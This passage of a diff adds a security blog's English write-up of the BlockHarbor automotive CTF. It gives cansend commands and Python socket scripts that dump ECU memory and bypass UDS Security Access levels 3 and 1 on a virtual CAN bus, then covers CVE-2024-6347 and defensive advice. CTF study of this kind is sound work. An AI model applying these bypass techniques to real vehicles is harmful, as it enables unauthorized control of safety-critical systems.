+        print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;error&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Through the code above, data in the &lt;code&gt;0xC3F83000&lt;/code&gt; range can be parsed.&lt;/p&gt;
+&lt;p&gt;Although the Python &lt;code&gt;can&lt;/code&gt; module is typically used for CAN communication, it is unavailable in a simulation environment&amp;#x2026; Therefore, it was written using the &lt;code&gt;socket&lt;/code&gt; module as a replacement.&lt;/p&gt;
+&lt;p&gt;When representing the CAN format with the Python &lt;code&gt;socket&lt;/code&gt; module, the argument &lt;code&gt;=IB3x8s&lt;/code&gt; must be provided.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image20.png&#34; alt=&#34;image20.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The flag present in memory can be confirmed by executing the code.&lt;/p&gt;
+&lt;h3 id=&#34;3-5-Security-Access-Level-3&#34;&gt;&lt;a href=&#34;#3-5-Security-Access-Level-3&#34; class=&#34;headerlink&#34; title=&#34;3.5. Security Access Level 3&#34;&gt;&lt;/a&gt;3.5. Security Access Level 3&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image21.png&#34; alt=&#34;image21.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This challenge requires identifying the cryptographic algorithm for Security Access Level 3 and finding the corresponding key for the seed value 0x1337. As described in the problem, the length of both the seed and the key for Level 3 is 2 bytes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image22.png&#34; alt=&#34;[image22.png](https://blog.naver.com/suresofttech/223327497814)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First, let&amp;#x2019;s look at the Security Access function provided by UDS.&lt;/p&gt;
+&lt;p&gt;Security Access is a service that controls access rights to the ECU. It&amp;#x2019;s helpful to think of higher numbers representing higher levels of authority. It is used with SID &lt;code&gt;27&lt;/code&gt; after first changing to the Extended Diagnostic Session (&lt;code&gt;10&lt;/code&gt; - &lt;code&gt;03&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;A seed value is generated, and a key is created through an internal cryptographic algorithm. Communication is performed in a way that grants access if authentication with the corresponding key value is successful. A key point here is that only when sending the key value, the request must be made using the access level value being accessed plus 1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image23.png&#34; alt=&#34;image23.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#021003&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 27(SID:SecurityAccess) 03(Level)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#022703&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#042704KEYS&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Authentication for Level 3 can be performed according to the Security Access authentication sequence.&lt;/p&gt;
+&lt;p&gt;First, after changing to the Extended Diagnostic Session (&lt;code&gt;1030&lt;/code&gt;), the seed value &lt;code&gt;7E53&lt;/code&gt; generated by the Security Access Level 3 request (&lt;code&gt;2703&lt;/code&gt;) can be confirmed. Upon transmitting the corresponding key value, Security Access was successful, as confirmed by the Security Access RSID (&lt;code&gt;67&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;The cryptographic algorithm used was a simple one that performs a bitwise inversion of the seed value. Therefore, the flag can be obtained as the result of &lt;code&gt;0x1337 ^ 0xFFFF&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# security access level 3 pass&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, data
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+    data1 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x10\x03\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame1 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data1)
+    p.send(frame1)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    data2 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x27\x03\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame2 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data2)
+    p.send(frame2)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+    seed = msg_data.hex()[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;]
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Seed: &lt;span class=&#34;hljs-subst&#34;&gt;{seed}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+    
+    key = &lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;&lt;span class=&#34;hljs-subst&#34;&gt;{~int(seed, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFF&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;04&lt;/span&gt;X}&lt;/span&gt;&amp;quot;&lt;/span&gt;
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Keys: &lt;span class=&#34;hljs-subst&#34;&gt;{key}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+    
+    key_bytes = int(key, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;).to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;big&amp;apos;&lt;/span&gt;)
+    data3 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x04\x27\x04&amp;quot;&lt;/span&gt; + key_bytes + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame3 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data3)
+    p.send(frame3)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+    
+    print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Security access level 3 unlock!&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image24.png&#34; alt=&#34;image24.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Additionally, the calculated key value must be transmitted within a very short time after confirming the seed value. Therefore, it is recommended to write code like the one above (though you can do it manually if you are fast enough).&lt;/p&gt;
+&lt;h3 id=&#34;3-6-Security-Access-Level-1&#34;&gt;&lt;a href=&#34;#3-6-Security-Access-Level-1&#34; class=&#34;headerlink&#34; title=&#34;3.6. Security Access Level 1&#34;&gt;&lt;/a&gt;3.6. Security Access Level 1&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image25.png&#34; alt=&#34;image25.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This challenge requires identifying the Security Access Level 1 cryptographic algorithm by reading the memory in the &lt;code&gt;0x1A000&lt;/code&gt; range. The flag is the key value for the seed &lt;code&gt;0x7D0E1A5C&lt;/code&gt;. It is known that the seed and key lengths for Level 1 are 4 bytes.&lt;/p&gt;
+&lt;p&gt;Oddly, in this UDS Challenge, Level 1 is placed after Level 3.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# read memory&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, dlc, data
+
+recvdata = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    can_id_filter = &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;
+    can_mask_filter = &lt;span class=&#34;hljs-number&#34;&gt;0xFFF&lt;/span&gt;
+    can_filter = struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=II&amp;quot;&lt;/span&gt;, can_id_filter, can_mask_filter)
+    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)
+    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; hex_value &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;0x1A000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1B000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xFF&lt;/span&gt;):
+        candata = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x07\x23\x14&amp;quot;&lt;/span&gt; + hex_value.to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\xff&amp;quot;&lt;/span&gt;
+        
+        data1 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x10\x02\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+        frame1 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7DF&lt;/span&gt;, data1)
+        p.send(frame1)
+        
+        frame_r1 = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        
+        frame2 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7DF&lt;/span&gt;, candata)
+        p.send(frame2)
+        
+        frame_r2 = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)
+        
+        recvdata += data_r2.hex()[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:]
+        
+        data3 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x30\x00\x00\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+        frame3 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data3)
+        p.send(frame3)
+        
+        temp = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; temp &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt;:
+            frame_r_loop = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)
+            
+            tempdata = data_loop.hex()[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:]
+            
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; tempdata != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;00000000000000&amp;quot;&lt;/span&gt;:
+                recvdata += tempdata
+            temp = temp + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
+
+print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;recv data: &lt;span class=&#34;hljs-subst&#34;&gt;{recvdata}&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;First, write the code to perform a read operation on the memory in the &lt;code&gt;0x1A000&lt;/code&gt; region.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image26.png&#34; alt=&#34;image26.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Previously, execute the code that authenticates Level 3 first to pass the Level 3 authentication.&lt;/p&gt;
+&lt;p&gt;After that, if you execute the memory read code you just wrote, you can confirm that a 4-byte value exists twice. You can confirm that this value changes every time a seed value is generated through a security access Level 1 request.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;hex(&lt;span class=&#34;hljs-number&#34;&gt;0x983cb51b&lt;/span&gt; ^ &lt;span class=&#34;hljs-number&#34;&gt;0xcd051f0c&lt;/span&gt;)
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0x5539aa17&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;hex(&lt;span class=&#34;hljs-number&#34;&gt;0xddee9870&lt;/span&gt; ^ &lt;span class=&#34;hljs-number&#34;&gt;0x88d73267&lt;/span&gt;)
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0x5539aa17&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;hex(&lt;span class=&#34;hljs-number&#34;&gt;0x4a4499ad&lt;/span&gt; ^ &lt;span class=&#34;hljs-number&#34;&gt;0x1f7d33ba&lt;/span&gt;)
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0x5539aa17&amp;apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It can be seen that performing an XOR operation on those values results in a fixed value of &lt;code&gt;0x5539aa17&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Through this, we can know that a key value calculated with the seed value exists in memory. And we can also know that the calculation algorithm is &lt;code&gt;seed ^ 0x5539aa17&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image28.png&#34; alt=&#34;image27.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#021003&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 27(SID:SecurityAccess) 01(Level)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#022701&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#062702KEYSKEYS&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When attempting Security Access Level 1 authentication using the discovered encryption algorithm, it can be seen that it succeeds, confirming the RSID (&lt;code&gt;67&lt;/code&gt;).&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# security access level 1 pass&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, data
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+    data1 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x10\x03\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame1 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data1)
+    p.send(frame1)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    data2 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x27\x01\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame2 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data2)
+    p.send(frame2)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    seed_bytes = msg_data[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;]
+    seed_int = int.from_bytes(seed_bytes, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;big&amp;apos;&lt;/span&gt;)
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Seed: &lt;span class=&#34;hljs-subst&#34;&gt;{seed_int:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;X}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+
+    key_int = seed_int ^ &lt;span class=&#34;hljs-number&#34;&gt;0x5539AA17&lt;/span&gt;
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Key: &lt;span class=&#34;hljs-subst&#34;&gt;{key_int:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;X}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+
+    key_bytes = key_int.to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;big&amp;apos;&lt;/span&gt;)
+    data3 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x06\x27\x02&amp;quot;&lt;/span&gt; + key_bytes
+    frame3 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data3)
+    p.send(frame3)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Security access level 1 unlock!&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image28.png&#34; alt=&#34;image28.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The code to unlock Security Access Level 1 can also be written.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image29.jpg&#34; alt=&#34;image29.jpg&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-CVEs-occurring-due-to-UDS-commands&#34;&gt;&lt;a href=&#34;#4-CVEs-occurring-due-to-UDS-commands&#34; class=&#34;headerlink&#34; title=&#34;4. CVEs occurring due to UDS commands&#34;&gt;&lt;/a&gt;4. CVEs occurring due to UDS commands&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image30.jpg&#34; alt=&#34;image30.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Security vulnerabilities can occur with UDS commands learned through the BlockHarbor CTF, and there are actual cases where CVEs are issued. A prime example is &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-6347&#34;&gt;CVE-2024-6347&lt;/a&gt;, which occurred in the Nissan Altima.&lt;/p&gt;
+&lt;p&gt;CVE-2024-6347 is a case where a DoS vulnerability occurred via UDS commands. The DoS vulnerability was caused by unauthorized access to the ECU programming session in the blind spot detection sensor ECU firmware.&lt;/p&gt;
+&lt;p&gt;Furthermore, vulnerabilities through CAN/UDS can include Information Leakage through Read Data By Identifier Request (&lt;code&gt;22&lt;/code&gt;) and various Diagnostic Requests (&lt;code&gt;19&lt;/code&gt;, etc.), and the acquisition of ECU and in-vehicle privileges through Security Access (&lt;code&gt;27&lt;/code&gt;) bypass. In particular, if validation for Read Memory By Address Request (&lt;code&gt;23&lt;/code&gt;) is inadequate, the firmware can be leaked through internal memory access.&lt;/p&gt;
+&lt;p&gt;Therefore, rigorous validation of CAN/UDS messages and access control for security access can be said to be the most fundamental elements in vehicle security.&lt;/p&gt;
+&lt;p&gt;Next time, I will return with a different embedded topic! Thank you! &amp;#x1F44B;&amp;#x1F3FB;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/image01.jpg">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2025/11/20/newp1ayer48/can/en/">
+
+  <title>[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
